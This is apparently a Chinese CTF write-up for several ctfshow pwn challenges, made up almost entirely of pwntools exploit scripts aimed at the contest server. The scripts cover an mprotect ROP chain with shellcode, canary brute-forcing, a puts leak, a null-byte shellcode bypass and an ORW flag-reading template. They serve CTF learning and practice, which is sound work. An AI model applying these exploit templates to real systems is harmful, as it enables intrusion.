# ctfshow pwn题解（部分）

## 49 mprotect（32）

一个`mprotect`的题，主要是记一下模板

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
#gdb.attach(p)

mprotect  = elf.sym['mprotect']
addr = 0x80DA000
size = 0x1000
proc = 0x7
pop_ebx_esi_ebp_ret = 0x80a019b
read = elf.sym['read']

payload = b'a'*0x12+b'b'*0x4+p32(mprotect)
payload+=p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(size)+p32(proc)
payload+=p32(read)
payload+=p32(pop_ebx_esi_ebp_ret)+p32(0)+p32(addr)+p32(size)+p32(addr)

p.sendline(payload)
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```

## 52 函数传参（32）

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28294)
#gdb.attach(p)
flag = 0x8048586

payload = b'a'*0x6C+b'b'*0x4+p32(flag)+p32(0)+p32(876)+p32(877)

p.sendline(payload)
p.interactive()
```

## 53 32位canary爆破

```python
from pwn import *
context.log_level = 'critical'
canary = b''
for i in range(4):
    for c in range(0xFF):
        #io = process('./pwn')
        io = remote('pwn.challenge.ctf.show',28248)
        io.sendlineafter('>',b'-1')
        payload = b'a'*0x20 + canary + p8(c)
        io.sendafter('$ ',payload)
        io.recv(1)
        ans = io.recv()
        print (ans)
        if b'Canary Value Incorrect!' not in ans:
            print ('The index({}),value({})'.format(i,c))
            canary += p8(c)
            break
        else:
            print ('tring... ...')
        io.close()

#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28248)
elf = ELF('./pwn')
flag = elf.sym['flag']
payload = b'a'*0x20 + canary + p32(0)*4 + p32(flag)
io.sendlineafter('>',b'-1')
io.sendafter('$ ',payload)
io.interactive()
```

## 54 puts遇见'\x00'截断，可以填充满导致后续内容溢出

```python
from pwn import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
p = remote('pwn.challenge.ctf.show',28241)
p.sendlineafter(b'Username:\n',b'a'*256)
p.recvuntil(b'aa,')
password = p.recv(33)
p.close()
p = remote('pwn.challenge.ctf.show',28241)
p.sendline('amdin')
p.sendlineafter(b'.\n',password)
p.interactive()
```

## 66 \x00绕过可能后面还要补一个\xc0或\x22什么的指令填充一下

```python
from pwn import *
context(os = 'linux',arch = 'amd64')
p = process('./pwn')
payload = b'\x00\xc0'+asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
```

## 68 ORW的板子

```python
from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28170)
mmap = 0x123000
jmp_rsp = 0x400a01
orw_shellcode = shellcraft.open("/ctfshow_flag") # 打开根目录下的ctfshow_flag文件
orw_shellcode += shellcraft.read(3,mmap,100) # 读取文件标识符是3的文件0x100个字节存放到mmap分配的地址空间里
orw_shellcode += shellcraft.write(1,mmap,100) # 将mmap地址上的内容输出0x100个字节
shellcode = asm(orw_shellcode)
## read里的fd写3是因为程序执行的时候文件描述符是从3开始的，write里的1是标准输出到显示器
payload = asm(shellcraft.read(0,mmap,0x100))+asm("mov rax,0x123000; jmp rax")
# buf里的rop是往mmap里读入0x100长度的数据，跳转到mmap的地址执行
payload = payload.ljust(0x28,'a') # buf的大小是0x20，加上rbp 0x8是0x28，用'\x00'去填充剩下的位置
payload += p64(jmp_rsp)+asm("sub rsp,0x30; jmp rsp") # 返回地址写上跳转到rsp
io.recvuntil('do')
io.sendline(payload)
io.sendline(shellcode)
io.interactive()
```

## read的系统调用号为0x3,execve的系统调用号为0xb

